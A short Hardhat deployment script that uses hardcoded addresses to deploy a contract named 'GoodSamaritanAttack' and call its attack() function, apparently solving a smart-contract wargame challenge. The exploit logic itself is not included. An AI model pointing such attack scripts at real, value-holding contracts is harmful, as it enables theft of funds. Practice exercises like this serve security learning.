const { ethers } = require("hardhat");

async function main() {
  const instanceAddress = "0x21844b088C3c8c64d8E713B9553560BdEE3aCE64";
  const coinAddress = "0x55B7Fb85f4D2290c0e0F6b42B7B95232e751d72b";

  const [attacker] = await ethers.getSigners();
  console.log("Using this address for attack:", attacker.address);

  const Contract = await ethers.getContractFactory("GoodSamaritanAttack");
  const contract = await Contract.deploy(instanceAddress, coinAddress);

  // Attack

  const tx = await contract.attack();
  await tx.wait();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
